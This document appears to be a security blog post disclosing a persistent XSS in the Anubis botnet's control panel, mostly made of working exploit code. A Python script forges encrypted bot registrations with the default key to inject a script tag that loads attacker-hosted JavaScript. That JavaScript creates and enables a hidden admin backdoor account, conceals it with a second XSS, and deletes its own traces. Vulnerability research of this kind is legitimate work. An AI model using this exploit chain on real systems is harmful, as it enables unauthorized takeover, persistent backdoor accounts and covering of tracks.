### Anubis - Botnet Takeover

The Anubis Botnet suffers from a persistent XSS vuln within the botnet panel. By abusing the XSS we are able to create an admin account and through a second persistent XSS we can even hide this account from the user panel to not directly disclose our new backdoor user. The versions I looked at were 2.5 and 7.0 (guess the last one is just a re-brand from someone else...). Both versions suffer from the same issue. As I'm writing this it is still a 0day.


Pretty much every traffic between the bot and the control panel is encrypted with a key (same for all bots belonging to the same botnet). This is per default `zanubis` and I bet a lot of skidz don't change it.

The problem comes from the fact that while they do make a call to `htmlspecialchars` on user input. They do it _before_ decrypting the content and don't do it afterwards. This is not how it works guys, but hey, who am I to judge ;P

So let's have a look at the code...

a3.php
```php
$request = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);  // [1]
...
$request = decrypt($request,cryptKey);					  // [2]
...
$massivReq = explode(":", $request);
$IMEI = isset($massivReq[0]) ? $massivReq[0] : "";		  // [3]
$phoneNumber =isset($massivReq[1]) ? $massivReq[1] : "";
...
$statement = $connection->prepare("insert into kliets (IMEI,number,version,country,bank,model,lastConnect,firstConnect,version_apk,l_bank,inj)
		value ('$IMEI','$phoneNumber','$Version','$country','$bank','$model','$data','$data','$Version_apk','$iconCard','$iconInj')");
		$statement->execute(array($IMEI,$phoneNumber,$Version,$country,$bank,$model,$data,$data,$Version_apk,$iconCard,$iconInj));			// [4]

```

They get user input from the "bot" at [1]. Then they decrypt it ([2]) and split the string ([3]) to set various variables.

Then later on if the IMEI is not already registered to the panel, they add the bot into their botnet at [4]. Up until now no issue, but do they do a `htmlspecialchars` when `echo`ing out the various values?

For this we need to have a look at `botstable.php` which get's included when the operator is looking at all their bots.

botstable.php
```php
...
		foreach($statement as $row)
		{
			$ID = $row['id'];
			$IMEI = $row['IMEI'];					// [5]
			$ip = $row['ip'];
			$number = $row['number'];
			...
							echo "<td>
							...
							name='kom_save' value='$IMEI' title='Save' ><img src='images/icons/save.png'  title='Save' alt='img' width='18px' style='padding-left: 0px' class='img_log'
							...
							";						// [6]
```

They execute the SQL statement to get all the bots (or only a subset of them) and for each row they set their corresponding variables ([5]) and use the exact (non sanitized, non encoded) values returned by the SQL statement ([6]).

This allows for a persistent XSS attack when we do know the encryption key. One method as mentioned would be to just try the default value `zanubis`, another method would be to crack the value as one endpoint (`/o1o/a11.php`) returns a known plaintext encrypted so we would be able to crack the key offline.

Ok, so assume we got the key and are able to exploit the first XSS. With the IMEI we are restricted to 300 chars in our payload (based on the database configuration). We just need to create a JS payload which we'll host on some server and use the XSS to include that script into the page. The JS payload then adds another user and deletes our bot info to clear the traces and not invoke/exploit the XSS anymore.


```js
function addUser(user, pw) {
        const Http = new XMLHttpRequest();
        const uri = 'application/set/addUsers.php';
        Http.open("POST", uri);
        Http.setRequestHeader("Content-type", "application/x-www-form-urlencoded")
        // inj js into the tag as it is persistent xss, to hide the new user
        var tag = '"><script>table = document.getElementById("bootstrap-table"); rowCount = table.rows.length; table.deleteRow(rowCount -1);</script>'; // [7]
        Http.send("login="+user+"&password="+pw+"&RIGHT=admin&tag="+tag+"&ADDUSER=ADD+USER");

        Http.onreadystatechange=function(){
                if (this.readyState == 4 && (this.status == 200 || this.status == 302)) {

                        enableName = getEnableName()
                        if (enableName != "ERROR") {
                                enableUser(enableName)
                        }
                }
        }

}

```
All this function does is create a new user through the corresponding HTTP request. The neat part is at [7], there we add some additional "info" to our user, which of course get's `echo`d to the page without being sanitized/encoded which brings us to the second XSS. The payload then removes the last element from the user table, hence not showing our new backdoor user we just created. This was the most fun part of the whole process.


That's it, below you can see the python exploit code and also the JS part. A final note, don't hate on the `#!/usr/bin/env python2`, the sploit is years old ;P


payload.js
```js
function sendEnableUser(enableName) {
        const Http = new XMLHttpRequest();
        const uri = '?cont=settings&page=users';
        Http.open("POST", uri);
        Http.setRequestHeader("Content-type", "application/x-www-form-urlencoded")
        Http.send(enableName+"=ENABLE")
}

function enableUser() {
        var enableName;

        const Http = new XMLHttpRequest();
        const uri = '?cont=settings&page=users';

        // find "enable\d\d"
        Http.onreadystatechange=function(){
                if (this.readyState == 4) {
                        resp = Http.responseText;
                        matches = resp.match(/enable\d\d/g);
                        if (matches.length > 0 ) {
                                enableName = matches[ matches.length-1]; // return last match
                                //alert("Enabling User: "+enableName)
                                // send request to enable the user
                                sendEnableUser(enableName)
                        } else {        
                                //alert("ERROR")
                        }
                }       
        }
        Http.open("GET", uri);
        Http.send();
}

function addUser(user, pw) {
        const Http = new XMLHttpRequest();
        const uri = 'application/set/addUsers.php';
        Http.open("POST", uri);
        Http.setRequestHeader("Content-type", "application/x-www-form-urlencoded")
        // inj js into the tag as it is persistent xss, to hide the new user
        var tag = '"><script>table = document.getElementById("bootstrap-table"); rowCount = table.rows.length; table.deleteRow(rowCount -1);</script>';
        Http.send("login="+user+"&password="+pw+"&RIGHT=admin&tag="+tag+"&ADDUSER=ADD+USER");

        Http.onreadystatechange=function(){
                if (this.readyState == 4 && (this.status == 200 || this.status == 302)) {

                        enableName = getEnableName()
                        if (enableName != "ERROR") {
                                enableUser(enableName)
                        }
                }
        }

}

function delClientEntry() {
        // get the id of our payload/pseudo client
        // Find the value, imei provided
        matches = document.documentElement.innerHTML.match(/value=\"\d+:751a7e1e83a492c8/g)[0]

        // Get the value
        id = matches.replace('value="', '')

        const Http = new XMLHttpRequest();
        const uri = '?cont=bots&page=1';
        Http.open("POST", uri);
        Http.setRequestHeader("Content-type", "application/x-www-form-urlencoded")
        Http.send("delete=Delete&checks[]="+id)

}


addUser("user1", "password")
enableUser()
delClientEntry()


```



anubis_pxss_sploit.py
```python

#!/usr/bin/env python2
import base64
import sys
import requests


xss_vuln_endpoint = "/o1o/a3.php"


# Seen some code which does no exit/die after setting the Location 
# header, therefore a bypass is just to don't follow redirects
def isBackdoored(target):
  url = target + "/anubis/index.php"
  r = requests.get(url, allow_redirects=False)
  if "<title>------</title>" in r.text:
    return True
  return False

# url can't include ":" 
def createInject(url):
  return '<script src="//{}"></script>'.format(url)

def injectXSS(target, myjs, key="zanubis"):

  url = target + xss_vuln_endpoint

  # `IMEI` varchar(300) NOT NULL,
  imei = '751a7e1e83a492c8' + createInject(myjs)
  # `number` varchar(300) DEFAULT NULL,
  phoneNum = "01234567890"
  # `version` varchar(100) NOT NULL,
  version = "1.12"
  # `country` varchar(30) DEFAULT NULL,
  country = "germany"
  # `bank` varchar(500) DEFAULT NULL,
  bank = 'superbank'
  # `model` varchar(50) DEFAULT NULL,
  model = "newModel"
  # `version_apk` varchar(20) DEFAULT NULL,
  versionApk = "1.13"
  # `av` varchar(500) DEFAULT NULL,
  av = "noav"
  # `l_bank` varchar(2) DEFAULT NULL,
  iconCard = "ab"
  # `inj` varchar(2) DEFAULT NULL,
  iconInj = "cd"
	
  
  """
  $request = decrypt($request,cryptKey);
  $request=str_replace(":)",")",$request);
  $massivReq = explode(":", $request);
  $IMEI = isset($massivReq[0]) ? $massivReq[0] : "";
  $phoneNumber =isset($massivReq[1]) ? $massivReq[1] : "";
  $Version = isset($massivReq[2]) ? $massivReq[2] : "";
  [...]
  """

  #payload = encrypt(imei+":"+phoneNum+":"+version+":"+country+":"+bank+":"+model+":"+versionApk+":"+av+":"+iconCard+":"+iconInj, key) 
  payload = encrypt(imei+":"+phoneNum+":"+version, key) 
  data = { "p" : payload }
  r = requests.post(url, data=data)
  txt = r.text.replace("<tag>", "").replace("</tag>", "")
  print("Payload: {}".format(payload))
  if "|OK|" in decrypt(txt):
    print("[+] Injected XSS... Should trigger soon ;)")
  else:
    print("[-] Failed to inject XSS...")


def crackKey(txt, hasToInclude):
  # Implement it if you want
  # but I recommend doing that in C/Rust/Go whatever
  # and not doing it with python....
  return False 

# Check if the key is valid 
def checkKey(target):
  url = target + "/o1o/a11.php"
  hasToInclude = "<html><body style='background:#000'><center>"

  r = requests.get(url)
  txt = r.text.replace("<tag>","").replace("</tag>", "")
  if hasToInclude in decrypt(txt):
    return True
  else:
    if crackKey(txt, hasToInclude):
      return True
  return False


def KSA(key):
  keylength = len(key)

  S = range(256)

  j = 0
  for i in range(256):
    j = (j + S[i] + key[i % keylength]) % 256
    S[i], S[j] = S[j], S[i]  # swap

  return S


def PRGA(S):
  i = 0
  j = 0
  while True:
    i = (i + 1) % 256
    j = (j + S[i]) % 256
    S[i], S[j] = S[j], S[i] # swap

    K = S[(S[i] + S[j]) % 256]
    yield K


def RC4(key):
  S = KSA(key)
  return PRGA(S)

def convert_key(s):
  return [ord(c) for c in s]

def decrypt(msg, key="zanubis"):
  ret = ""
  key = convert_key(key)
  keystream = RC4(key)

  msg = base64.b64decode(msg)
  msg = msg.decode('hex')
  for c in msg:
    mychar = chr(ord(c) ^ keystream.next())
    ret += mychar

  return ret


def encrypt(msg, key="zanubis"):
  ret = ""
  key = convert_key(key)
  keystream = RC4(key)

  for c in msg:
    mychar = chr(ord(c) ^ keystream.next())
    ret += mychar.encode('hex')

  ret = base64.b64encode(ret)
  return ret


if __name__ == "__main__":

  if len(sys.argv) != 3:
    print("Usage: python {} <target> <jsurl>".format(sys.argv[0]))
    print("Usage: python {} http://secure.com/ 10.1.1.20/jquery.js".format(sys.argv[0]))
    sys.exit(0)

  target = sys.argv[1]
  jsurl = sys.argv[2]

  if isBackdoored(target):
    print("[+] {} is backdoored...".format(target))
    sys.exit(0)

  if checkKey(target):
    print("[+] Botnet uses default pw: zanubis")
    print("[+] XSS Possible!")
    injectXSS(target, jsurl)
  else:
    print("[-] Botnet uses non-default pw...")


```
